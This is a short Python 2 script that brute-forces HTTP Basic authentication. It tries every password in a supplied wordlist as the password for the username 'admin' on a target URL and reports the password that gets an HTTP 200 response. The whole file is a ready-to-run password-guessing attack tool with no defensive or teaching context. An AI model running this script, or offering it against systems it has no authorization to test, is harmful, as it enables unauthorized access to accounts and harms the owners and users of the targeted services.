#!/usr/bin/env python
# encoding:utf-8
import requests
import sys,os

def burp(url,passfile):
    print "[*] burp " + url + " with " + passfile
    with open(passfile,'r') as f:
        for p in f.readlines():
            p = p.rstrip()
            print "[*] Try --> " + str(p)
            os.system('cls')
            r = requests.get(url,auth=('admin',p))
            
            if r.status_code == 200:
                print "[+] Found  admin:" + str(p)
                break
            else:
                pass

burp(sys.argv[1],sys.argv[2])
